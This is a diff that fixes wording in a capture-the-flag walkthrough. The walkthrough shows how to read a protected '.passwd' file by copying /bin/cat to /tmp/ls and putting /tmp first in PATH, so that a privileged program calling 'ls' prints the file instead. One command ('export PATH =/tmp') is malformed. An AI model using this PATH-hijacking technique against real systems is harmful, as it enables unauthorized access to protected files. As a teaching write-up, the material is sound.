@@ -10,8 +10,8 @@
     }
 
 
-// To capture the flag we need to read the ".passwd" file. But in the code, the system use "ls" command, so we need to change "ls" command to "cat" command.
-// By using "which" command, we file the execution file of "cat":
+// To capture the flag we need to read the ".passwd" file. But in the code, the system uses "ls" command, so we need to change "ls" command to "cat" command.
+// By using "which" command, we find where the execution file of "cat" command is:
 $ which cat // ==> /bin/cat
 
 // The "/tmp" is only the directory that we have the right for writing, so we can create one program that can run as "ls" command. The most simple solution is copy the "/bin/cat" file to "/tmp" 
@@ -19,8 +19,8 @@ $ cp /bin/cat /tmp/ls
 
 // Then, we need to add "/tmp" into the PATH
 $ export PATH=/tmp:$PATH 
-//or more simple
+// or more simple
 $ export PATH =/tmp
 
-// Then run the "ch11" to show the context of ".passwd"
+// Then run "ch11" to show the context of ".passwd"
 ./ch11
